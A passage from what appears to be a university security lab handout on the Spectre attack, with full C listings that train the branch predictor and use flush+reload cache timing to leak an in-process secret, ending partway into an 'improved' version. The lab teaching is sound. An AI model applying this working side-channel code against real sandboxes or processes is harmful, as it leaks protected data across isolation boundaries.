+<h3>The Experiment<a class="headerlink" href="#the-experiment" title="Permalink to this headline">¶</a></h3>
+<p>In this task, we use an experiment to observe the effect caused by an
+out-of-order execution. The code used in this experiment is shown below.
+Some of the functions used in the code is the same as that in the
+previous tasks, so they will not be repeated.</p>
+<div class="literal-block-wrapper docutils container" id="id8">
+<div class="code-block-caption"><span class="caption-text">Listing 3: SpectreExperiment.c</span><a class="headerlink" href="#id8" title="Permalink to this code">¶</a></div>
+<div class="highlight-c notranslate"><div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;emmintrin.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;x86intrin.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp"></span>
+
+<span class="cp">#define CACHE_HIT_THRESHOLD (80)</span>
+<span class="cp">#define DELTA 1024</span>
+
+<span class="kt">int</span> <span class="n">size</span> <span class="o">=</span> <span class="mi">10</span><span class="p">;</span>
+<span class="kt">uint8_t</span> <span class="n">array</span><span class="p">[</span><span class="mi">256</span><span class="o">*</span><span class="mi">4096</span><span class="p">];</span>
+<span class="kt">uint8_t</span> <span class="n">temp</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+<span class="kt">void</span> <span class="nf">flushSideChannel</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
+
+  <span class="c1">// Write to array to bring it to RAM to prevent Copy-on-write</span>
+  <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="n">array</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">4096</span> <span class="o">+</span> <span class="n">DELTA</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+
+  <span class="c1">//flush the values of the array from cache</span>
+  <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="n">_mm_clflush</span><span class="p">(</span><span class="o">&amp;</span><span class="n">array</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">4096</span> <span class="o">+</span><span class="n">DELTA</span><span class="p">]);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">reloadSideChannel</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">junk</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
+  <span class="k">register</span> <span class="kt">uint64_t</span> <span class="n">time1</span><span class="p">,</span> <span class="n">time2</span><span class="p">;</span>
+  <span class="k">volatile</span> <span class="kt">uint8_t</span> <span class="o">*</span><span class="n">addr</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
+  <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
+    <span class="n">addr</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">array</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">4096</span> <span class="o">+</span> <span class="n">DELTA</span><span class="p">];</span>
+    <span class="n">time1</span> <span class="o">=</span> <span class="n">__rdtscp</span><span class="p">(</span><span class="o">&amp;</span><span class="n">junk</span><span class="p">);</span>
+    <span class="n">junk</span> <span class="o">=</span> <span class="o">*</span><span class="n">addr</span><span class="p">;</span>
+    <span class="n">time2</span> <span class="o">=</span> <span class="n">__rdtscp</span><span class="p">(</span><span class="o">&amp;</span><span class="n">junk</span><span class="p">)</span> <span class="o">-</span> <span class="n">time1</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">time2</span> <span class="o">&lt;=</span> <span class="n">CACHE_HIT_THRESHOLD</span><span class="p">){</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">&quot;array[%d*4096 + %d] is in cache.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">DELTA</span><span class="p">);</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;The Secret = %d.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">i</span><span class="p">);</span>
+    <span class="p">}</span>
+  <span class="p">}</span> 
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">victim</span><span class="p">(</span><span class="kt">size_t</span> <span class="n">x</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">x</span> <span class="o">&lt;</span> <span class="n">size</span><span class="p">)</span> <span class="p">{</span>  
+      <span class="n">temp</span> <span class="o">=</span> <span class="n">array</span><span class="p">[</span><span class="n">x</span> <span class="o">*</span> <span class="mi">4096</span> <span class="o">+</span> <span class="n">DELTA</span><span class="p">];</span>  
+  <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
+
+  <span class="c1">// FLUSH the probing array</span>
+  <span class="n">flushSideChannel</span><span class="p">();</span>
+
+  <span class="c1">// Train the CPU to take the true branch inside victim()</span>
+  <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>   
+      <span class="n">victim</span><span class="p">(</span><span class="n">i</span><span class="p">);</span>
+  <span class="p">}</span>
+
+  <span class="c1">// Exploit the out-of-order execution</span>
+  <span class="n">_mm_clflush</span><span class="p">(</span><span class="o">&amp;</span><span class="n">size</span><span class="p">);</span>
+  <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+      <span class="n">_mm_clflush</span><span class="p">(</span><span class="o">&amp;</span><span class="n">array</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">4096</span> <span class="o">+</span> <span class="n">DELTA</span><span class="p">]);</span> 
+  <span class="n">victim</span><span class="p">(</span><span class="mi">97</span><span class="p">);</span>  
+
+  <span class="c1">// RELOAD the probing array</span>
+  <span class="n">reloadSideChannel</span><span class="p">();</span>
+
+  <span class="k">return</span> <span class="p">(</span><span class="mi">0</span><span class="p">);</span> 
+<span class="p">}</span>
+</pre></div>
+</div>
+</div>
+<p>For CPUs to perform a speculative execution, they should be able to
+predict the outcome of the if condition. CPUs keep a record of the
+branches taken in the past, and then use these past results to predict
+what branch should be taken in a speculative execution. Therefore, if we
+would like a particular branch to be taken in a speculative execution,
+we should train the CPU, so our selected branch can become the
+prediction result. The training is done in the <code class="docutils literal notranslate"><span class="pre">for</span></code> loop starting
+from Line ③. Inside the loop, we invoke <code class="docutils literal notranslate"><span class="pre">victim()</span></code> with a small
+argument (from 0 to 9). These values are less than the value <code class="docutils literal notranslate"><span class="pre">size</span></code>,
+so the true-branch of the if-condition in Line ① is always taken. This is
+the training phase, which essentially trains the CPU to expect the
+if-condition to come out to be true.</p>
+<p>Once the CPU is trained, we pass a larger value (<code class="docutils literal notranslate"><span class="pre">97</span></code>) to the
+<code class="docutils literal notranslate"><span class="pre">victim()</span></code> function (Line ⑤). This value is larger than <code class="docutils literal notranslate"><span class="pre">size</span></code>, so
+the false-branch of the if-condition inside <code class="docutils literal notranslate"><span class="pre">victim()</span></code> will be taken
+in the actual execution, not the true-branch. However, we have flushed
+the variable <code class="docutils literal notranslate"><span class="pre">size</span></code> from the memory, so getting its value from the
+memory may take a while. This is when the CPU will make a prediction,
+and start speculative execution.</p>
+<div class="section" id="task-3">
+<h4>Task 3<a class="headerlink" href="#task-3" title="Permalink to this headline">¶</a></h4>
+<p>Please compile the <code class="docutils literal notranslate"><span class="pre">SpectreExperiment.c</span></code> program shown in
+Listing 3 (see Section 2 for the compilation instruction); run the program and describe your observations. There may
+be some noise in the side channel due to extra things cached by the CPU,
+we will reduce the noise later, but for now you can execute the task
+multiple times to observe the effects. Please observe whether Line ② is
+executed or not when <code class="docutils literal notranslate"><span class="pre">97</span></code> is fed into <code class="docutils literal notranslate"><span class="pre">victim()</span></code>. Please also do the
+followings:</p>
+<ul class="simple">
+<li><p>Comment out the line marked with ✰ and execute again. Explain your
+observation. After you are done with this experiment, uncomment it,
+so the subsequent tasks are not affected.</p></li>
+<li><p>Replace Line ④ with <code class="docutils literal notranslate"><span class="pre">victim(i</span> <span class="pre">+</span> <span class="pre">20)</span></code>; run the code again and explain
+your observation.</p></li>
+</ul>
+</div>
+</div>
+</div>
+<div class="section" id="task-4-the-spectre-attack">
+<h2>Task 4: The Spectre Attack<a class="headerlink" href="#task-4-the-spectre-attack" title="Permalink to this headline">¶</a></h2>
+<p>As we have seen from the previous task, we can get CPUs to execute a
+true-branch of an if statement, even though the condition is false. If
+such an out-of-order execution does not cause any visible effect, it is
+not a problem. However, most CPUs with this feature do not clean the
+cache, so some traces of the out-of-order execution is left behind. The
+Spectre attack uses these traces to steal protected secrets.</p>
+<p>These secrets can be data in another process or data in the same
+process. If the secret data is in another process, the process isolation
+at the hardware level prevents a process from stealing data from another
+process. If the data is in the same process, the protection is usually
+done via software, such as sandbox mechanisms. The Spectre attack can be
+launched against both types of secret. However, stealing data from
+another process is much harder than stealing data from the same process.
+For the sake of simplicity, this lab only focuses on stealing data from
+the same process.</p>
+<p>When web pages from different servers are opened inside a browser, they
+are often opened in the same process. The sandbox implemented inside the
+browser will provide an isolated environment for these pages, so one
+page will not be able to access another page’s data. Most software
+protections rely on condition checks to decide whether an access should
+be granted or not. With the Spectre attack, we can get CPUs to execute
+(out-of-order) a protected code branch even if the condition checks
+fails, essentially defeating the access check.</p>
+<div class="section" id="the-setup-for-the-experiment">
+<h3>The Setup for the Experiment<a class="headerlink" href="#the-setup-for-the-experiment" title="Permalink to this headline">¶</a></h3>
+<div class="align-center figure align-default" id="id9">
+<img alt="Experiment setup: the buffer and the protected secret" src="../../_images/buffer_new.jpg" />
+<p class="caption"><span class="caption-text">Figure 4: Experiment setup: the buffer and the protected secret</span><a class="headerlink" href="#id9" title="Permalink to this image">¶</a></p>
+</div>
+<p><strong>Figure 4</strong> illustrates the setup for the
+experiment. In this setup, there are two types of regions: restricted
+region and non-restricted region. The restriction is achieved via an
+if-condition implemented in a sandbox function described below. The
+sandbox function returns the value of <code class="docutils literal notranslate"><span class="pre">buffer[x]</span></code> for an <code class="docutils literal notranslate"><span class="pre">x</span></code> value
+provided by users, only if <code class="docutils literal notranslate"><span class="pre">x</span></code> is between the buffer’s lower and upper
+bounds. Therefore, this sandbox function will never return anything in
+the restricted area to users.</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>unsigned int bound_lower = 0;
+unsigned int bound_upper = 9;
+uint8_t buffer[10] = {0,1,2,3,4,5,6,7,8,9};
+
+// Sandbox Function
+uint8_t restrictedAccess(size_t x)
+{
+  if (x &lt;= bound_upper &amp;&amp; x &gt;= bound_lower) {
+     return buffer[x];
+  } else {
+     return 0;
+  }
+}
+</pre></div>
+</div>
+<p>There is a secret value in the restricted area (either above the buffer
+or below it), and the secret’s address is known to the attacker, but the
+attacker cannot directly access the memory holding the secret value. The
+only way to access the secret is through the above sandbox function.
+From the previous section, we have learned that although the true-branch
+will never be executed if <code class="docutils literal notranslate"><span class="pre">x</span></code> is larger than the buffer size, at
+microarchitectural level, it can be executed and some traces can be left
+behind when the execution is reverted.</p>
+</div>
+<div class="section" id="the-program-used-in-the-experiment">
+<h3>The Program Used in the Experiment<a class="headerlink" href="#the-program-used-in-the-experiment" title="Permalink to this headline">¶</a></h3>
+<p>The code for the basic Spectre attack is shown below. In this code,
+there is a secret defined in Line ①. Assume that we cannot directly
+access the <code class="docutils literal notranslate"><span class="pre">secret</span></code>, <code class="docutils literal notranslate"><span class="pre">bound_lower</span></code>, or <code class="docutils literal notranslate"><span class="pre">bound_upper</span></code> variables (we
+do assume that we can flush the two bound variables from the cache). Our
+goal is to print out the secret using the Spectre attack. The code below
+only steals the first byte of the secret. Students can extend it to
+print out more bytes.</p>
+<div class="literal-block-wrapper docutils container" id="id10">
+<div class="code-block-caption"><span class="caption-text">Listing 4: SpectreAttack.c</span><a class="headerlink" href="#id10" title="Permalink to this code">¶</a></div>
+<div class="highlight-c notranslate"><div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;emmintrin.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;x86intrin.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp"></span>
+
+<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">bound_lower</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">bound_upper</span> <span class="o">=</span> <span class="mi">9</span><span class="p">;</span>
+<span class="kt">uint8_t</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="mi">9</span><span class="p">};</span> 
+<span class="kt">char</span>    <span class="o">*</span><span class="n">secret</span>    <span class="o">=</span> <span class="s">&quot;Some Secret Value&quot;</span><span class="p">;</span>   
+<span class="kt">uint8_t</span> <span class="n">array</span><span class="p">[</span><span class="mi">256</span><span class="o">*</span><span class="mi">4096</span><span class="p">];</span>
+
+<span class="cp">#define CACHE_HIT_THRESHOLD (80)</span>
+<span class="cp">#define DELTA 1024</span>
+
+<span class="c1">// Sandbox Function</span>
+<span class="kt">uint8_t</span> <span class="nf">restrictedAccess</span><span class="p">(</span><span class="kt">size_t</span> <span class="n">x</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">x</span> <span class="o">&lt;=</span> <span class="n">bound_upper</span> <span class="o">&amp;&amp;</span> <span class="n">x</span> <span class="o">&gt;=</span> <span class="n">bound_lower</span><span class="p">)</span> <span class="p">{</span>
+     <span class="k">return</span> <span class="n">buffer</span><span class="p">[</span><span class="n">x</span><span class="p">];</span>
+  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+     <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="p">}</span> 
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">flushSideChannel</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
+  <span class="c1">// Write to array to bring it to RAM to prevent Copy-on-write</span>
+  <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="n">array</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">4096</span> <span class="o">+</span> <span class="n">DELTA</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+  <span class="c1">//flush the values of the array from cache</span>
+  <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="n">_mm_clflush</span><span class="p">(</span><span class="o">&amp;</span><span class="n">array</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">4096</span> <span class="o">+</span><span class="n">DELTA</span><span class="p">]);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">reloadSideChannel</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">junk</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
+  <span class="k">register</span> <span class="kt">uint64_t</span> <span class="n">time1</span><span class="p">,</span> <span class="n">time2</span><span class="p">;</span>
+  <span class="k">volatile</span> <span class="kt">uint8_t</span> <span class="o">*</span><span class="n">addr</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
+  <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
+    <span class="n">addr</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">array</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">4096</span> <span class="o">+</span> <span class="n">DELTA</span><span class="p">];</span>
+    <span class="n">time1</span> <span class="o">=</span> <span class="n">__rdtscp</span><span class="p">(</span><span class="o">&amp;</span><span class="n">junk</span><span class="p">);</span>
+    <span class="n">junk</span> <span class="o">=</span> <span class="o">*</span><span class="n">addr</span><span class="p">;</span>
+    <span class="n">time2</span> <span class="o">=</span> <span class="n">__rdtscp</span><span class="p">(</span><span class="o">&amp;</span><span class="n">junk</span><span class="p">)</span> <span class="o">-</span> <span class="n">time1</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">time2</span> <span class="o">&lt;=</span> <span class="n">CACHE_HIT_THRESHOLD</span><span class="p">){</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;array[%d*4096 + %d] is in cache.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">DELTA</span><span class="p">);</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;The Secret = %d(%c).</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">i</span><span class="p">,</span> <span class="n">i</span><span class="p">);</span>
+    <span class="p">}</span>
+  <span class="p">}</span> 
+<span class="p">}</span>
+<span class="kt">void</span> <span class="nf">spectreAttack</span><span class="p">(</span><span class="kt">size_t</span> <span class="n">index_beyond</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
+  <span class="kt">uint8_t</span> <span class="n">s</span><span class="p">;</span>
+  <span class="k">volatile</span> <span class="kt">int</span> <span class="n">z</span><span class="p">;</span>
+  <span class="c1">// Train the CPU to take the true branch inside restrictedAccess().</span>
+  <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> 
+      <span class="n">restrictedAccess</span><span class="p">(</span><span class="n">i</span><span class="p">);</span> 
+  <span class="p">}</span>
+  <span class="c1">// Flush bound_upper, bound_lower, and array[] from the cache.</span>
+  <span class="n">_mm_clflush</span><span class="p">(</span><span class="o">&amp;</span><span class="n">bound_upper</span><span class="p">);</span>
+  <span class="n">_mm_clflush</span><span class="p">(</span><span class="o">&amp;</span><span class="n">bound_lower</span><span class="p">);</span>
+  <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>  <span class="p">{</span> <span class="n">_mm_clflush</span><span class="p">(</span><span class="o">&amp;</span><span class="n">array</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">4096</span> <span class="o">+</span> <span class="n">DELTA</span><span class="p">]);</span> <span class="p">}</span>
+  <span class="k">for</span> <span class="p">(</span><span class="n">z</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">z</span> <span class="o">&lt;</span> <span class="mi">100</span><span class="p">;</span> <span class="n">z</span><span class="o">++</span><span class="p">)</span>  <span class="p">{</span>   <span class="p">}</span>
+  <span class="c1">// Ask restrictedAccess() to return the secret in out-of-order execution. </span>
+  <span class="n">s</span> <span class="o">=</span> <span class="n">restrictedAccess</span><span class="p">(</span><span class="n">index_beyond</span><span class="p">);</span>  
+  <span class="n">array</span><span class="p">[</span><span class="n">s</span><span class="o">*</span><span class="mi">4096</span> <span class="o">+</span> <span class="n">DELTA</span><span class="p">]</span> <span class="o">+=</span> <span class="mi">88</span><span class="p">;</span>  
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+  <span class="n">flushSideChannel</span><span class="p">();</span>
+  <span class="kt">size_t</span> <span class="n">index_beyond</span> <span class="o">=</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)(</span><span class="n">secret</span> <span class="o">-</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">buffer</span><span class="p">);</span>  
+  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;secret: %p </span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">secret</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;buffer: %p </span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;index of secret (out of bound): %ld </span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">index_beyond</span><span class="p">);</span>
+  <span class="n">spectreAttack</span><span class="p">(</span><span class="n">index_beyond</span><span class="p">);</span>
+  <span class="n">reloadSideChannel</span><span class="p">();</span>
+  <span class="k">return</span> <span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="p">}</span>
+</pre></div>
+</div>
+</div>
+<p>Most of the code is the same as that in
+Listing 3, so we
+will not repeat their explanation here. The most important part is in
+Lines ②, ③, and  ④ . Line ④ calculates the offset of the secret from the
+beginning of the buffer (we assume that the address of the secret is
+known to the attacker; in real attacks, there are many ways for
+attackers to figure out the address, including guessing). The offset is
+definitely beyond the scope of the buffer, so it is larger than the
+upper bound of the buffer or smaller than the lower bound (i.e., a
+negative number). The offset is fed into the <code class="docutils literal notranslate"><span class="pre">restrictedAccess()</span></code>
+function. Since we have trained the CPU to take the true-branch inside
+<code class="docutils literal notranslate"><span class="pre">restrictedAccess()</span></code>, the CPU will return <code class="docutils literal notranslate"><span class="pre">buffer[index_beyond]</span></code>,
+which contains the value of the secret, in the out-of-order execution.
+The secret value then causes its corresponding element in <code class="docutils literal notranslate"><span class="pre">array[]</span></code> to
+be loaded into cache. All these steps will eventually be reverted, so
+from the outside, only zero is returned from <code class="docutils literal notranslate"><span class="pre">restrictedAccess()</span></code>, not
+the value of the secret. However, the cache is not cleaned, and
+<code class="docutils literal notranslate"><span class="pre">array[s*4096</span> <span class="pre">+</span> <span class="pre">DELTA]</span></code> is still kept in the cache. Now, we just need
+to use the side-channel technique to figure out which element of the
+<code class="docutils literal notranslate"><span class="pre">array[]</span></code> is in the cache.</p>
+<div class="section" id="the-task">
+<h4>The Task.<a class="headerlink" href="#the-task" title="Permalink to this headline">¶</a></h4>
+<p>Please compile and execute <code class="docutils literal notranslate"><span class="pre">SpectreAttack.c</span></code>. Describe your
+observation and note whether you are able to steal the secret value. If
+there is a lot of noise in the side channel, you may not get consistent
+results every time. To overcome this, you should execute the program
+multiple times and see whether you can get the secret value.</p>
+</div>
+</div>
+</div>
+<div class="section" id="task-5-improve-the-attack-accuracy">
+<h2>Task 5: Improve the Attack Accuracy<a class="headerlink" href="#task-5-improve-the-attack-accuracy" title="Permalink to this headline">¶</a></h2>
+<p>In the previous tasks, it may be observed that the results do have some
+noise and the results are not always accurate. This is because CPU
+sometimes load extra values in cache expecting that it might be used at
+some later point, or the threshold is not very accurate. This noise in
+cache can affect the results of our attack. We need to perform the
+attack multiple times; instead of doing it manually, we can use the
+following code to perform the task automatically.</p>
+<p>We basically use a statistical technique. The idea is to create a score
+array of size 256, one element for each possible secret value. We then
+run our attack for multiple times. Each time, if our attack program says
+that <code class="docutils literal notranslate"><span class="pre">k</span></code> is the secret (this result may be false), we add <code class="docutils literal notranslate"><span class="pre">1</span></code> to
+<code class="docutils literal notranslate"><span class="pre">scores[k]</span></code>. After running the attack for many times, we use the value
+<code class="docutils literal notranslate"><span class="pre">k</span></code> with the highest score as our final estimation of the secret. This
+will produce a much reliable estimation than the one based on a single
+run. The revised code is shown in the following.</p>
+<div class="literal-block-wrapper docutils container" id="id11">
+<div class="code-block-caption"><span class="caption-text">Listing 5: SpectreAttackImproved.c</span><a class="headerlink" href="#id11" title="Permalink to this code">¶</a></div>
+<div class="highlight-c notranslate"><div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;emmintrin.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;x86intrin.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>
+
+
+<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">bound_lower</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">bound_upper</span> <span class="o">=</span> <span class="mi">9</span><span class="p">;</span>
+<span class="kt">uint8_t</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="mi">9</span><span class="p">};</span> 
+<span class="kt">uint8_t</span> <span class="n">temp</span>    <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="kt">char</span>    <span class="o">*</span><span class="n">secret</span> <span class="o">=</span> <span class="s">&quot;Some Secret Value&quot;</span><span class="p">;</span>   
+<span class="kt">uint8_t</span> <span class="n">array</span><span class="p">[</span><span class="mi">256</span><span class="o">*</span><span class="mi">4096</span><span class="p">];</span>
+
+<span class="cp">#define CACHE_HIT_THRESHOLD (80)</span>
+<span class="cp">#define DELTA 1024</span>
+
+<span class="c1">// Sandbox Function</span>
+<span class="kt">uint8_t</span> <span class="nf">restrictedAccess</span><span class="p">(</span><span class="kt">size_t</span> <span class="n">x</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">x</span> <span class="o">&lt;=</span> <span class="n">bound_upper</span> <span class="o">&amp;&amp;</span> <span class="n">x</span> <span class="o">&gt;=</span> <span class="n">bound_lower</span><span class="p">)</span> <span class="p">{</span>
+     <span class="k">return</span> <span class="n">buffer</span><span class="p">[</span><span class="n">x</span><span class="p">];</span>
+  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+     <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">flushSideChannel</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
+  <span class="c1">// Write to array to bring it to RAM to prevent Copy-on-write</span>
+  <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="n">array</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">4096</span> <span class="o">+</span> <span class="n">DELTA</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+  <span class="c1">//flush the values of the array from cache</span>
